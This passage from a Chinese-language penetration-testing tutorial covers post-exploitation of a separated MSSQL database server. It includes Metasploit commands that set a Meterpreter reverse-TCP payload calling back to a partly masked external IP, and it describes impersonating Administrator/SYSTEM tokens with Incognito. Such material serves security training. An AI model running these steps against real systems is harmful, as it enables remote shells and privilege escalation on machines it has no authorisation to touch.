#### **(2) 执行远程Payload**

目标主机允许通外网时我们可以直接利用Metasploit下的`exploit/multi/script/web_delivery`和`exploit/windows/misc/hta_server`两个模块来执行远程Payload获取会话，比第一种方法更简单快捷。

```
set target 1
set payload windows/x64/meterpreter/reverse_tcp
set lhost 155.**.***.229
set lport 443
exploit
```

![img](../../../../repo/assets/19.SQL注入/wps18.jpg) 

 

#### **(3) 模拟令牌权限提升**

笔者曾经在几个这样的“MSSQL站库分离”实战环境中直接通过Incognito扩展中的模拟令牌功能获取到数据库服务器的Admin/SYSTEM令牌。

 

在本地“站库分离”靶场环境中测试发现，只要有主机在使用Windows身份验证连接到这台数据库服务器的MSSQL时就会保留当前登录用户的令牌，而大多数人又都是以默认Administrator管理员来安装的MSSQL，所以能够直接获取到Administrator令牌。

 

支持Windows身份验证的数据库连接工具有：`sqlcmd`、`SSMS`和Navicat Premium等。

```
C:\Program Files\Microsoft SQL Server\100\Tools\Binn\sqlcmd.exe -S "192.168.1.109" -E
```

![img](../../../../repo/assets/19.SQL注入/wps19.jpg) 

 

